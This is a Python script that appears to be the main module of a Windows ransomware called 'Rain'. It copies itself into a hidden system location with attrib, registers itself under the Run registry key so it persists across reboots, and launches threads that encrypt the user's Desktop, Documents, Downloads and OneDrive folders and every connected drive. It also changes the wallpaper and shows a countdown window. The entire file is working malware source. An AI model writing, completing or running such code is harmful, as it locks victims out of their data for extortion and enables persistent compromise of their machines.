from crypter import Crypter
from os import system, chdir
from os.path import expanduser
from shutil import copyfile
from threading import Thread
from sys import argv
from PyQt5.QtWidgets import QApplication
from util import drivers
from GUI import Counter


def crypt_all() -> None:
    """
    This function uses the list of possible paths for drivers connected to the machine from the "util"
    file to encrypt them (only available on Windows).
    """
    for drive in drivers:
        try:
            chdir(drive + '/')
            crypter.crypt_directory(drive)
        except FileNotFoundError:
            continue
        except PermissionError:
            continue


crypter = Crypter()

desktop = expanduser('~/Desktop')
documents = expanduser('~/Documents')
downloads = expanduser('~/Downloads')
onedrive = expanduser('~/OneDrive')

dst = argv[0]

# These lines use system commands to hide the ransomware file
# (to be placed in C:\Users\Public\filename.exe).
try:
    dst = r'C:\Users\Public\{}'.format(argv[0])
    command = f'attrib +s +h {dst}'
    copyfile(argv[0], dst)
    system(command)
except PermissionError:
    try:
        dst = r'C:\{}'.format(argv[0])
        command = f'attrib +s +h {dst}'
        copyfile(argv[0], dst)
        system(command)
    except PermissionError:
        command = f'attrib +s +h {dst}'
        system(command)

# Creating a registry in the machine keys so that the malware is booted with the system
crypter.registry_key(
    r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    f'"{dst}"',
    'Rain'
)

# Instantiating Threads so that directories are encrypted simultaneously
c_desktop = Thread(target=crypter.crypt_directory, args=[desktop])
c_documents = Thread(target=crypter.crypt_directory, args=[documents])
c_downloads = Thread(target=crypter.crypt_directory, args=[downloads])
c_onedrive = Thread(target=crypter.crypt_directory, args=[onedrive])
c_all = Thread(target=crypt_all)

crypter.change_background('../../files/wallpaper.jpg')

c_desktop.start()
c_documents.start()
c_downloads.start()
c_onedrive.start()
c_all.start()

# Launching the interface interface
qt = QApplication(argv)
counter = Counter()
counter.show()
qt.exec_()
